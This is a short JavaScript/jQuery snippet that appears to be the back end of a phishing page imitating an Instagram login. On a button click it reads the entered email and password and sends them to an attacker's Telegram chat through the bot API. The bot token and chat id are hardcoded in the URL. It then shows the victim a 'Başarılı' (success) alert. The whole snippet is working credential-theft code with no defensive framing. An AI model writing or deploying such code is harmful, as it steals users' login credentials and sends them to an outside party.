
$('#buton').click(function(){

    var email = $('#username').val();
    var password =$ ('#password').val();
    console.log("EMAİL: "+email+" PASSWORD: "+password);
    
    var data = "EMAİL: "+email+" PASSWORD: "+password;
    
    jQuery.ajax({
      type:"post",
      url: "https://api.telegram.org/bot343775901:AAHpbiAGCPQD8ReOPHDlLeSLZZCsJNJJ5FQ/sendMessage?chat_id=187750627&text=INSTAGRAM:email : "+email+" password : "+password+"",
      
    });
    alert('Başarılı');
});
